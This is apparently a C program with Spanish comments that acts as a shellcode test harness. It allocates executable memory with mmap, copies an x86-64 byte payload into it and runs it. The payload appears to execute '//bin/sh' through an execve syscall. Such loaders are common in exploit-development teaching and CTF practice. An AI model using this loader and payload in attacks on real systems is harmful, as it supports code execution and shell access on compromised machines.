#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

unsigned char shellcode[] = 
    "\x48\x31\xc0\x50\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57"
    "\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb8\x3b\x00\x00\x00\x0f\x05";

int main() {
    printf("Ejecutando shellcode...\n");

    // Obtener el tamaño del shellcode
    size_t shellcode_size = sizeof(shellcode);

    // Reservar memoria RWX con mmap
    void *exec_mem = mmap(NULL, shellcode_size, 
                          PROT_READ | PROT_WRITE | PROT_EXEC, 
                          MAP_ANON | MAP_PRIVATE, -1, 0);
    
    if (exec_mem == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    // Copiar el shellcode a la memoria ejecutable
    memcpy(exec_mem, shellcode, shellcode_size);

    // Ejecutar el shellcode
    ((void(*)())exec_mem)();

    return 0;
}
